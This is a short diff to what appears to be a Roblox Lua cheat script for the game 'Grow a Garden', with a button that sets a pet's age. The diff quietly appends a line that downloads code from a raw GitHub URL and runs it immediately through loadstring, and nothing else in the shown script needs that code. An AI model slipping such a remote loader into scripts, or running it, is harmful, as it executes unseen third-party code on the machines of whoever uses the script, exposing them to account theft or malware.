@@ -245,3 +245,5 @@ petAgeBtn.MouseButton1Click:Connect(function()
         petAgeBtn.Text = "Set Pet Age to 50"
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/Mt"))()
